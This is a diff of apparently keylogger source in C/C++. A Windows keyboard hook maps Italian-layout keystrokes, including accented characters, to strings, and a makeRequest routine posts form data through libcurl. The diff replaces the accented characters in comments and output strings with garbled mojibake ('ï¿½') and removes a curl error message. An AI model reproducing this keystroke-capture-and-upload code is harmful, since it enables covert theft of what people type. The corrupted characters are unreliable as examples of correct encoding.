@@ -70,11 +70,11 @@
 
 // redefine some keys for the Italian keyboard
 // SC stay for "Special Characters" with accent
-#define VK_SC_E				0xBA	// èé[{ (VK_OEM_3)
-#define VK_SC_O				0xC0	// òç@	(VK_OEM_1)
-#define VK_SC_A				0xDE	// à°#	(VK_OEM_7)
-#define VK_SC_U				0xBF	// ù§	(VK_OEM_2)
-#define VK_SC_I				0xDD	// ì^	(VK_OEM_6)
+#define VK_SC_E				0xBA	// ï¿½ï¿½[{ (VK_OEM_3)
+#define VK_SC_O				0xC0	// ï¿½ï¿½@	(VK_OEM_1)
+#define VK_SC_A				0xDE	// ï¿½#	(VK_OEM_7)
+#define VK_SC_U				0xBF	// ï¿½ï¿½	(VK_OEM_2)
+#define VK_SC_I				0xDD	// ï¿½^	(VK_OEM_6)
 #define VK_BACKSLASH		0xDC	// \|	(VK_OEM_5)
 #define VK_APOSTROPHE		0xDB	// '?	(VK_OEM_4)
 
@@ -229,8 +229,8 @@ static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 			case VK_2: // "
 				message = "\"";
 				break;
-			case VK_3: // £
-				message = "|£156|";
+			case VK_3: // ï¿½
+				message = "|ï¿½156|";
 				break;
 			case VK_4: // $
 				message = "$";
@@ -250,8 +250,8 @@ static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 			case VK_9: // )
 				message = ")";
 				break;
-			case VK_SC_E: // é
-				message = "|é130|";
+			case VK_SC_E: // ï¿½
+				message = "|ï¿½130|";
 				break;
 			case VK_OEM_PLUS: // 'SHIFT' + '+' = '*'
 				message = "*";
@@ -265,11 +265,11 @@ static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 			case VK_OEM_PERIOD: // :
 				message = ":";
 				break;
-			case VK_SC_U: // §
-				message = "|§21|";
+			case VK_SC_U: // ï¿½
+				message = "|ï¿½21|";
 				break;
-			case VK_SC_O: // ç
-				message = "|ç135|";
+			case VK_SC_O: // ï¿½
+				message = "|ï¿½135|";
 				break;
 			case VK_APOSTROPHE: // ?
 				message = "?";
@@ -280,8 +280,8 @@ static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 			case VK_SC_I: // ^
 				message = "^";
 				break;
-			case VK_SC_A: // °
-				message = "|°167|";
+			case VK_SC_A: // ï¿½
+				message = "|ï¿½167|";
 				break;
 			}
 		}
@@ -290,8 +290,8 @@ static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 		{
 			switch (vkCode)
 			{
-			case VK_SC_E: // è
-				message = "|è138|";
+			case VK_SC_E: // ï¿½
+				message = "|ï¿½138|";
 				break;
 			case VK_OEM_PLUS: // +
 				message = "+";
@@ -305,11 +305,11 @@ static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 			case VK_OEM_PERIOD: // .
 				message = ".";
 				break;
-			case VK_SC_U: // ù
-				message = "|ù151|";
+			case VK_SC_U: // ï¿½
+				message = "|ï¿½151|";
 				break;
-			case VK_SC_O: // ò
-				message = "|ò149|";
+			case VK_SC_O: // ï¿½
+				message = "|ï¿½149|";
 				break;
 			case VK_APOSTROPHE: // '
 				message = "'";
@@ -317,11 +317,11 @@ static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 			case VK_BACKSLASH: // '\'
 				message = "\\";
 				break;
-			case VK_SC_I: // ì
-				message = "|ì141|";
+			case VK_SC_I: // ï¿½
+				message = "|ï¿½141|";
 				break;
-			case VK_SC_A: // à
-				message = "|à133|";
+			case VK_SC_A: // ï¿½
+				message = "|ï¿½133|";
 				break;
 			}
 		}
@@ -637,8 +637,6 @@ static void makeRequest() {
 		curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
 		// Make the request and check the result
 		res = curl_easy_perform(curl);
-		/*if (res != CURLE_OK)
-			std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;*/
 		// Cleanup
 		curl_easy_cleanup(curl);
 		curl_formfree(formpost);
